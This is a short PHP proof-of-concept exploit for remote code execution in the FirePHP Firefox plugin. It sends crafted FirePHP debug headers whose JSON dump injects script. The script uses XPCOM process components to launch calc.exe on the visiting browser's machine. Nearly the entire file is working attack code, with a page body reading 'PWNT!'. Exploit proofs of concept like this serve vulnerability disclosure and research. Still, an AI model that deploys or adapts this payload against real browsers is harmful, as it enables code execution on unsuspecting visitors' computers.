<?php
/*************************************************************
 * FirePHP Firefox plugin RCE PoC                            *
 * Written by Wireghoul - http://www.justanotherhacker.com   *
 * Greetz to @bcoles @urbanadventurer @malerisch             *
 *************************************************************/

// XUL code to launch calc.exe
$exploit =  '{"RequestHeaders":{"1":"1","2":"2","3":"3","4":"4","5":"5","6":"6","7":"7","8":"8","9":"9","UR<script>';
$exploit.= 'var lFile=Components.classes[\"@mozilla.org/file/local;1\"].createInstance(Components.interfaces.nsILocalFile);';
$exploit.= 'lFile.initWithPath(\"C:\\\\\\\\Windows\\\\\\\\system32\\\\\\\\calc.exe\");';
$exploit.= 'var process=Components.classes[\"@mozilla.org/process/util;1\"].createInstance(Components.interfaces.nsIProcess);';
$exploit.= 'process.init(lFile);';
$exploit.= 'process.run(true,[],0);void(0);';
$exploit.= '<\/SCRIPT>":"PWNT"}}';

// Send FirePHP dump data
header("X-Wf-Protocol-1: http://meta.wildfirehq.org/Protocol/JsonStream/0.2");
header("X-Wf-1-Plugin-1: http://meta.firephp.org/Wildfire/Plugin/FirePHP/Library-FirePHPCore/0.3");
header("X-Wf-1-Structure-1: http://meta.firephp.org/Wildfire/Structure/FirePHP/Dump/0.1");
$payload= "X-Wf-1-1-1-1: ";
$payload.= strlen($exploit).'|'.$exploit."|\r\n";
header($payload);
?>
<html>
<head>
  <title>FirePHP Firefox plugin RCE PoC</title>
</head>
<body>
PWNT!
</body>
</html>
